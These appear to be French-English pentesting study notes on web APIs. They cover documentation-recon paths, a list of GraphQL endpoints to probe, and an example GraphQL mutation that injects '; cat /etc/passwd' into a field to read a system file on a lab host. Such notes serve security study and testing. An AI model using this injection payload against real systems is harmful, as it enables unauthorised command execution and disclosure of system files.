# Web API

## standard type

SOAP
RESTful
GrpahQL

## Data Type

XML
JSON

## common content type:

application/json
application/xml 
application/x-www-form-urlencoded 

## Convention

| Convention | Meaning |
-------------------------
| ":" or "{}" | variables |
| "[]" | optional input |
| "||" | possible values that can be used. |
| "< >" | ex. <find-function> Angle brackets represent a DomString, which is a 16-bit string. |

## tools généralement utilisés pour les tests (hors sécu)

Postman
Client http du même langage de programmation
OWASP Zap

## Doc pour la collecte d'info

* https://www.programmableweb.com/
* shodan

### liste de repertoires pour trouver la doc:

/docs
/api/docs
/documentation
/developers/documentation

### liste de sous domaines pour trouver la doc

dev.
api.

### detect graphQL

/graphql
/v1/graphql
/api/graphql
/v1/api/graphql
Attacking GraphQL   291
/graph
/v1/graph
/graphiql
/v1/graphiql
/console
/query
/graphql/console
/altair
/playground

### exemples

#### exemple type d'injection GraphQL retournant le fichier /etc/passwd

```sh
POST /graphql HTTP/1.1
Host: 192.168.195.132:5000
Accept: application/json
Content-Type: application/json

{"variables": {"scheme": "http",
"path": "/ ; cat /etc/passwd",
"port": 80, "host": "test.com"},
"query": "mutation ImportPaste ($host: String!, $port: Int!, $path: String!, $scheme: String!)
{\n importPaste(host: $host, port: $port, path: $path, scheme: $scheme)
{\n result\n }\n }"}
```
